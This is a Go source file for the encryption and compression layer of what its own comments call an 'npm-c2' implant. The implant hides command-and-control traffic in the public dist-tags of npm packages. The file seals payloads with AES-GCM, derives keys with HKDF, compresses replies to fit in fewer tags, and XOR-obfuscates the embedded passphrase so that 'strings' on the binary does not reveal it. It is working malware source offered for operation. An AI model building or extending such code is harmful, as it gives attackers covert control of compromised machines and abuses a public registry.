package main

// End-to-end encryption for the tag channel.
//
// The registry is public: anyone can GET a package's dist-tags and read the
// payloads. Base64 is not protection, so every payload is sealed with
// AES-256-GCM under a key derived from a shared passphrase with HKDF.
//
// Sealing happens before chunking: the whole plaintext becomes one blob,
// which is then split across tags. Chunking first and sealing each chunk
// would leave no way to reassemble.
//
// Wire format, before base64url: nonce(12) || ciphertext || tag(16).

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
)

var keyInfo = []byte("npm-c2 tag channel v1")

const (
	nonceLen  = 12
	gcmTagLen = 16

	// compressMin: below this, zlib's header costs more than it saves.
	compressMin = 64
	markerRaw   = 0x00
	markerZlib  = 0x01
)

// deriveKey turns the operator passphrase into 32 bytes of key material.
// HKDF-SHA256, written out because stdlib hkdf is x/crypto.
func deriveKey(passphrase string) ([]byte, error) {
	if passphrase == "" {
		return nil, errors.New("empty passphrase")
	}
	salt := []byte("npm-c2-hkdf-salt")
	extract := hmac.New(sha256.New, salt)
	extract.Write([]byte(passphrase))
	prk := extract.Sum(nil)

	expand := hmac.New(sha256.New, prk)
	expand.Write(keyInfo)
	expand.Write([]byte{0x01})
	return expand.Sum(nil)[:32], nil
}

// seal encrypts plaintext with AES-256-GCM, binding it to aad.
func seal(key, plaintext, aad []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, nonceLen)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, aad), nil
}

// openSealed reverses seal. A wrong key or a tampered chunk fails here.
func openSealed(key, blob, aad []byte) ([]byte, error) {
	if len(blob) < nonceLen+gcmTagLen {
		return nil, errors.New("sealed payload too short")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, blob[:nonceLen], blob[nonceLen:], aad)
}

// xorWith keystream-XORs data, matching the token obfuscation scheme.
func xorWith(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// deobfuscateSecret recovers an embedded passphrase. The blob is hex of the
// XOR of the passphrase with sha256(package), so `strings` on the binary
// shows neither the passphrase nor the token.
func deobfuscateSecret(blobHex, pkg string) (string, error) {
	blob, err := hex.DecodeString(blobHex)
	if err != nil {
		return "", fmt.Errorf("passphrase blob is not hex: %w", err)
	}
	sum := sha256.Sum256([]byte(pkg))
	return string(xorWith(blob, sum[:])), nil
}

// channelKey derives the AES key from the embedded passphrase. An empty or
// malformed blob disables encryption rather than killing the implant: a node
// that cannot decrypt is still better than one that never starts.
func channelKey(pkg string) []byte {
	if embeddedKey == "" {
		return nil
	}
	pass, err := deobfuscateSecret(embeddedKey, pkg)
	if err != nil || pass == "" {
		return nil
	}
	key, err := deriveKey(pass)
	if err != nil {
		return nil
	}
	return key
}

// ---------------------------------------------------------------- compression

// compressPayload prefixes a one-byte marker describing the encoding.
// A tag carries ~174 bytes, so an uncompressed 1.3KB reply needs 8 tags;
// Windows output compresses ~25x and fits in one. Fewer tags means a smaller
// tag map, and the map is what every poll has to read.
func compressPayload(payload []byte) []byte {
	if len(payload) < compressMin {
		return append([]byte{markerRaw}, payload...)
	}
	var buf bytes.Buffer
	w, _ := zlib.NewWriterLevel(&buf, zlib.BestCompression)
	w.Write(payload)
	w.Close()
	if buf.Len() >= len(payload) {
		return append([]byte{markerRaw}, payload...)
	}
	return append([]byte{markerZlib}, buf.Bytes()...)
}

// decompressPayload undoes compressPayload. A bare payload with no marker is
// passed through so tags written before compression still decode.
func decompressPayload(blob []byte) ([]byte, error) {
	if len(blob) == 0 {
		return blob, nil
	}
	switch blob[0] {
	case markerZlib:
		r, err := zlib.NewReader(bytes.NewReader(blob[1:]))
		if err != nil {
			return nil, err
		}
		defer r.Close()
		return io.ReadAll(r)
	case markerRaw:
		return blob[1:], nil
	default:
		return blob, nil // legacy tag, no marker
	}
}
